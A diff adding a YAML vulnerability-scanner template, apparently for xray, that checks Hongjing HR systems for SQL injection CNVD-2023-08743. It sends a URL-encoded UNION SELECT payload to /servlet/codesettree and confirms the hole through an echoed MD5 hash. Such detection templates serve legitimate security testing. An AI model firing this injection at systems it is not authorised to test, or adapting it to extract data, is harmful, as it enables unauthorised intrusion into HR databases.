@@ -1,0 +1,31 @@
+name: yaml-poc-hjsoft-hj_hr-sql_injection-CNVD-2023-08743
+binding: d4d1d815-24b5-4c08-b498-3e08ba7d143b
+detail:
+    author: xiaobaicai
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2023-08743
+    vulnerability:
+        id: d9dbe920-46b9-47eb-91b2-a10892a250ea
+        level: high
+    warning: Harmless
+transport: http
+set:
+    s1: randomInt(1, 9)
+    s2: randomInt(1, 9)
+    s3: randomInt(1, 9)
+    s4: randomInt(1, 9)
+    s5: randomInt(1, 9)
+    s6: hex(string(s1))
+    s7: hex(string(s2))
+    s8: hex(string(s3))
+    s9: hex(string(s4))
+    s10: hex(string(s5))
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27~31~27~2csys~2efn~5fsqlvarbasetostr~28HashBytes~28~27MD~35~27~2c~27~{{s6}}~{{s7}}~{{s8}}~{{s9}}~{{s10}}~27~29~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(md5(string(s1) + string(s2) + string(s3) + string(s4) + string(s5))) && response.body_string.contains("<TreeNode id")
+expression: r0()
